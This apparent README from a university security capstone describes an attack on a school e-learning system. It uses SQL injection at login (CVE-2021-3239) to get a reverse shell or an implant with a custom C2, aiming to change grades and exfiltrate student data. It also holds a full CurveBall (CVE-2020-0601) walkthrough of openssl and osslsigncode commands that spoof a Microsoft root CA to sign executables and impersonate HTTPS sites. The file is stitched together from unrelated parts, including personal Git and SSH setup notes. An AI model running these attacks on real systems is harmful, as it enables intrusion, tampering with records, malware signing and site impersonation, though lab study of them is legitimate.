# CS590J Capstone 

The general idea: Victim is a school education system that has all the grades and tons of student/teacher information. Let's assume this is all stored on the same machine and we can put all these files on the desktop. We are a student that wants to have malicious access to this system to modify school files (change our grades, attendance), spy on peer's information, and whatever teacher files are on the computer (data modification and exfil). There is a vulnerability in the system (CVE-2021-3239): "E-Learning System 1.0" (an actual piece of software submitted to an open source website which was used by a public school in the Philippines) is vulnerable to SQL injection and we are able to authenticate by SQL injecting an "or TRUE" into the unsanitized login screen and then gain a reverse shell or install an implant. From here the implant runs and we connect to it via a C2 software that we wrote so that we can choose which data and when to extract it or when to abort.

#How to setup the victim and environment
To test this out, generally follow the setup instructions here: https://www.sourcecodester.com/php/12808/e-learning-system-using-phpmysqli.html.
- First setup a virtual machine in virtualbox of windows 10 old version: https://drive.google.com/file/d/1OUPmqJ7JiYdY5jt7T7G9oDnN01usJs7v/view?usp=sharing. I gave it 32 GB storage and 7 GB RAM, but more is better of course. All future instructions are from this VM.
- Install XAMP version 7.2.33 onto this windows VM(this version is important) https://www.apachefriends.org/download.html. You will have to click more and then find version 7.2.33. Download the most frequently downloaded copy of this version.
- Install netcat through nmap https://nmap.org/
- Install the most recent version of Python and pip install requests and colorama (it's a lot easier to see colored text stand out)
- Follow the instructions in the first link to setup E-Learning System 1.0. This includes extracting the CAIWL program, running apache and mySQL, setting up a database.
- Execute the python script (exploit.py) from anywhere (on the VM unless you specify the ports from another machine - we need to modify the code if we want it to open a port onto another VM). 
```
python exploit.py
``` 
- From here there are two options: either install and run the implant (enter 'i' when it prompts you to) and connect to the c2 server in another window by doing
```
python c2.py
``` 
- ...or just gain a reverse shell without installing the implant where you have another window running:
```
ncat -l 9999
```
- All in all the reverse shell looks like so:
![Image of the Reverse Shell](https://github.com/yshneyderman/CS590J-Capstone/blob/main/example.png)
- And the C2 looks like so
![Image of the C2](https://github.com/yshneyderman/CS590J-Capstone/blob/main/example2.png)


##How to Setup GitHub
Generate SSH Keys
- sudo apt-get install git
- git config --global user.email "yealsh21@gmail.com"
- git config --global user.name "Yefim"
- ssh-keygen -t ed25519 -C "yealsh21@gmail.com"
- eval "$(ssh-agent -s)"
- ssh-add ~/.ssh/id_ed25519
- sudo apt-get install xclip
- xclip -selection clipboard < ~/.ssh/id_ed25519.pub

Add SSH Keys
- Login to GitHub, click profile, click settings and add SSH Key. Paste Key, give any title.

Clone the Repository
- git clone git@github.com:yshneyderman/CS590J-Capstone.git

Install Ruby:
- sudo apt update
- sudo apt install ruby

Adding changes (to a branch)
- git commit -a -m "What I changed"
- git push

#CurveBall (CVE-2020-0601) Exploit



## Usage
Create a certificate with the same public key and parameters of a trusted CA. This will be used as our spoofing CA. Set the generator to a value, where you know the private key. You can easily set the generator to the public key, and have a private key set to `1`, since `Q = dG`.

Next up, you create a certificate signing request with the extensions you wish to use, e.g. code signing or server authentication.

Sign this certificate request with your spoofed CA and CA key, and add the usage extensions.

Bundle the signed certificate request (now a regular certificate) with the spoofed CA, and you have a signed and trusted certificate. 

When Windows checks whether the certificate is trusted, it'll see that it has been signed by our spoofed CA. It then looks at the spoofed CA's public key to check against trusted CA's. Then it simply verifies the signature of our spoofed CA with the spoofed CA's generator - this is the issue.

If you choose to open your newly and signed, trusted certificate in Windows, it'll not recognize it as trusted, since it hasn't been tied to anything, thus it will not use the spoofed CA. The certificate must always present itself with the spoofed CA.

## Code Signing
*Please use this for educational and researching purposes only.* 

Extract the public key from the CA and modify it according to the vulnerability:

    ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
Generate a new x509 certificate based on this key. This will be our own spoofed CA.

    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
Generate a new key. This key can be of any type you want. It will be used to create a code signing certificate, which we will sign with our own CA.

    openssl ecparam -name secp384r1 -genkey -noout -out cert.key
Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.

    openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs
Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.

    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs
The only thing left is to pack the certificate, its key and the spoofed CA into a PKCS12 file for signing executables.

    openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12
Sign your executable with PKCS12 file.

    osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in 7z1900-x64.exe -out 7z1900-x64_signed.exe

## SSL/TLS
*Please use this for educational and researching purposes only.* 
Extract the public key from the CA and modify it according to the vulnerability:

    ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
Generate a new x509 certificate based on this key. This will be our own spoofed CA.

    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
Generate a new key. This key be of any type you want. It will be used to create a SSL certificate, which we will sign with our own CA.

    openssl ecparam -name secp384r1 -genkey -noout -out cert.key
Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.

If you wish to change the domain name, edit `CN  = www.google.com` to `CN  = www.example.com` inside of `openssl_tls.conf`.

    openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.

    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
You can now use `cert.crt`, `cert.key`, and `spoofed_ca.crt` to serve your content. Again, remember to add the spoofed_ca.crt as a certificate chain in your server's HTTPS configuration.

See the usage example in [https://github.com/IIICTECH/-CVE-2020-0601---ECC-/blob/master/tls/index.js).

